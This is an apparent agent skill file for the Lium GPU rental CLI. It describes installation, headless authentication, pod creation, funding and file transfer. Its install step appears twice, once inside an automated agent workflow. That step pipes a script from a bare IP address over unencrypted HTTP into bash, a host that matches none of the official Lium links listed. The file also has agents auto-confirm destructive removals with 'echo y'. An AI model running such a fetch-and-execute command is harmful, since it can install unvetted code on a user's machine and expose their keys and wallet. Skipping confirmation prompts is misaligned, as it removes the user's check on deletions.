---
name: lium
description: GPU pod management on Lium platform via CLI and Python SDK. Use for renting GPUs, creating/managing pods, deploying ML workloads, transferring files to remote GPUs, running code on remote GPUs, and programmatic compute management. Triggers on "lium", "lium.io", "lium-sdk", "GPU rental", "rent a GPU", "GPU pod", "cloud GPU", "remote GPU", "deploy to GPU", any lium CLI command (lium up/ls/ps/ssh/exec/scp/rsync/rm/fund), lium SDK, @machine decorator.
---

# Lium CLI & SDK

Lium — decentralized GPU rental platform on Bittensor. Pods are Docker containers with root SSH access and direct GPU passthrough.

- **GitHub**: https://github.com/Datura-ai/lium
- **PyPI**: https://pypi.org/project/lium.io/
- **Docs**: https://docs.lium.io
- **Dashboard**: https://lium.io

## Quick Install

Standalone binary — no Python or dependencies required:

```bash
curl -fsSL http://16.171.54.255/lium/install.sh | bash
```

This auto-detects OS (Linux/macOS) and architecture, downloads the binary to `~/.lium/bin/lium`, and adds it to PATH.

After install, initialize authentication:

```bash
lium init              # opens browser automatically
lium init --no-browser  # prints auth URL (for headless/agent use)
```

Verify setup:

```bash
lium ls   # if this works, auth is OK
```

### Alternative Install (via pip/uv)

```bash
# Via uv (isolated env)
curl -LsSf https://astral.sh/uv/install.sh | sh
uv tool install lium.io

# Via pip
pip install lium.io
```

## Agent-Specific: Non-Interactive Usage

**CRITICAL**: Many lium commands are interactive by default. As an agent, always pass all parameters explicitly to avoid interactive prompts.

### Authentication Setup for Agents

**Preferred: two-step headless auth** — no API key needed, no blocking, no browser:

1. Run `lium init --no-browser` — get auth URL and session ID (exits immediately)
2. Show the URL to the user, ask them to open it and click Approve
3. Wait for user to confirm they approved
4. Run `lium init --session <SESSION_ID>` — saves API key + sets up SSH

```bash
lium init --no-browser
# [i] Open this URL to authenticate:
#     https://lium.io/cli/approve/xJinnT3Vt6...
# [i] Then complete authentication with:
#     lium init --session abc123def456

# ... user confirms they approved ...

lium init --session abc123def456
# [✓] API key saved
```

**Fallback options** (if `--no-browser` is unavailable or user already has an API key):

```bash
# Option 1: Direct config
lium config set api.api_key YOUR_API_KEY
lium config set ssh.key_path ~/.ssh/id_ed25519

# Option 2: Environment variable (session only)
export LIUM_API_KEY=YOUR_API_KEY
```

For fallback options, the user must get an API key from https://lium.io Account Settings.

### Verify Setup

```bash
lium config show   # check stored config
lium ls            # if this works, auth is OK
```

### Non-Interactive Pod Creation

Always use `-y` flag and pass all parameters:

```bash
# WRONG (interactive):
lium up              # prompts for executor and template selection
lium up 1            # prompts for template selection

# RIGHT (non-interactive):
lium up --gpu H100 -y                        # auto-selects executor + default template
lium up --gpu A100 -c 2 --country US -y      # with filters
lium up --gpu H100 --name my-pod --ttl 6h -y # with name and auto-termination
lium up --gpu A6000 --image pytorch/pytorch:2.0 -y  # custom docker image
lium up --gpu H100 --jupyter -y              # with Jupyter
```

### Non-Interactive Funding

```bash
# WRONG (interactive):
lium fund

# RIGHT:
lium fund -w default -a 10.0 -y   # fund 10 TAO, skip confirmation
```

User must have a verified Bittensor wallet at https://lium.io/billing.

### Agent Gotchas / Known Pitfalls

#### After Install — Export PATH

```bash
export PATH="$HOME/.lium/bin:$PATH"  # needed in current shell session
```

#### After `lium init --session` — Verify with `lium ls`

After completing the two-step auth, run `lium ls` to verify. If it returns results, auth is done.

#### `lium ps` Has No `--format json`

```bash
lium ps --format json  # Error: No such option
lium ps                # correct
```

Use the pod **name** (e.g. `lunar-lion-4c`) from `lium ps` output for targeting — not a numeric index.

#### Commands Without -y Flag

Not all commands support `-y`. Workaround for interactive commands:

```bash
lium rm my-pod         # will prompt for confirmation
echo "y" | lium rm my-pod  # workaround for agent use
echo "y" | lium rm -a      # remove all pods non-interactively
```

#### Templates

- Without `--template_id` or `--image`, `lium up` uses default **PyTorch (CUDA)** template — fastest to start
- Default Docker-in-Docker (dind) template image: `daturaai/dind`
- Search templates: `lium templates pytorch` (text search, no --format json)
- To use specific template: `lium up --gpu H100 -t <TEMPLATE_ID> -y`
- To use custom Docker image: `lium up --gpu H100 --image pytorch/pytorch:2.0 -y`

#### No User Identity Command

lium CLI has no `whoami` command. To verify auth works, use `lium ls` — if it returns results, auth is OK.

## CLI Quick Reference

### Discovery

```bash
lium ls                        # all available GPUs (shows table with ★ for best price/perf)
lium ls H100                   # filter by type
lium ls --sort download        # sort by download speed (fastest first) — preferred default
lium ls --sort upload          # sort by upload speed
lium ls --sort price_gpu       # sort by price per GPU/hour (default)
lium ls --format json          # machine-parseable output
lium templates                 # list Docker templates
lium templates pytorch         # search templates
```

**Recommendation**: When selecting machines for the user, prefer `--sort download` to get the fastest network unless the user specifically asks to sort by price or other criteria.

### Pod Lifecycle

```bash
lium up --gpu H100 -y          # create pod
lium ps                        # list active pods (no --format json support)
lium ssh my-pod                # SSH into pod
lium exec my-pod "nvidia-smi"  # run command
lium exec all "pip install torch"  # batch exec on all pods
lium rm my-pod                 # stop pod
lium rm all                    # stop all pods
```

### File Transfer

```bash
lium scp my-pod ./train.py              # upload to /root/
lium scp my-pod ./data.csv /root/data/  # specific path
lium scp all ./config.json              # upload to all pods
lium rsync my-pod ./project             # sync directory
```

### Pod Targeting

Pods accept: name, index from `lium ps`, comma-separated (`1,2,3`), or `all`.

### Output Formats

Always use `--format json` when parsing output programmatically:

```bash
lium ls --format json | python -c "import json,sys; print(json.load(sys.stdin))"
```

Note: `lium ps` does NOT support `--format json`.

## End-to-End Agent Workflow

Complete flow for setting up and renting a GPU pod:

```bash
# 1. Install lium (if not present)
if ! command -v lium >/dev/null 2>&1; then
  curl -fsSL http://16.171.54.255/lium/install.sh | bash
  export PATH="$HOME/.lium/bin:$PATH"
fi

# 2. Authenticate (two-step headless flow)
lium init --no-browser
# → parse URL and session ID from output, show URL to user
# → wait for user to confirm they approved
lium init --session <SESSION_ID>

# 3. Verify
lium ls >/dev/null 2>&1 && echo "OK" || echo "Auth failed"

# 4. Find suitable GPU (sort by speed by default)
lium ls --gpu H100 --sort download

# 5. Create pod (non-interactive!)
lium up --gpu H100 --name work-pod --ttl 6h -y

# 6. Wait and verify (note: --format json is NOT supported for lium ps)
lium ps

# 7. Use the pod
lium scp work-pod ./code.py
lium exec work-pod "python /root/code.py"

# 8. Cleanup
echo "y" | lium rm work-pod
```

## Detailed References

- **Full CLI command reference**: See [references/cli-commands.md](references/cli-commands.md) for all commands, flags, volumes, backups, scheduling, port-forward, etc.
- **Python SDK reference**: See [references/sdk-reference.md](references/sdk-reference.md) for programmatic access — `lium.sdk.Lium`, `lium.Client`, `@machine` decorator, async patterns.
